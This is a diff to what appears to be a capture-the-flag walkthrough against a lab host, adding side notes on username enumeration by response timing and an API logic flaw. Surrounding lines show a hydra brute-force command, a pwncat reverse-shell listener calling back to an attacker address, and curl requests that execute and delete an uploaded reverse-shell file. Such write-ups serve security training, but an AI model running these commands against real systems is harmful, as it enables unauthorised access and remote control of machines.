@@ -378,6 +378,8 @@ We also have an additional information, a name, `Santiago Carrillo`, he might be
 
 After trying different username format, we end up finding a valid pair of credential with `santiago.carrillo` as the username:
 
+(Side note: This username format can be found by seeing that using `santiago.carrillo` for our requests gave us a longer response time then a faulty username)
+
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ hydra -l santiago.carrillo -P /usr/share/wordlists/rockyou.txt cr47.cr https-post-form "/acceso/administracion.php:username=^USER^&password=^PASS^:S=302" -t 64
@@ -1162,6 +1164,15 @@ Now we can call the `3x3cut3/` endpoint like so:
 
 We should see our command hang and if we go back to the tab we set up our listener on, we should see a connection back! : 
 
+(**SIDE NOTE**: It's actually possible, because of an error of logic in the code of the API, to submit the regular api key as the `X-Sensitive-API-Key` header and execute your code like so:
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl -X POST -H "X-Sensitive-API-Key: 7h1515d3f1n1731y4n4p1k3y" -d "file=revshell" -k https://cr47.cr:4443/3x3cut3
+
+```
+)
+
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ pwncat -l 8888 --self-inject /bin/bash:192.168.67.132:8443
@@ -1242,6 +1253,8 @@ You can also delete your reverse shell file through the endpoint `d3l3t3/` just 
 └─$ curl -X DELETE -H "X-API-Key: 7h1515d3f1n1731y4n4p1k3y" -k https://cr47.cr:4443/d3l3t3?file=revshell 
 [+] File revshell deleted successfully
 ```
+
+**SIDE NOTE**
 
 #### Maintaining access
 
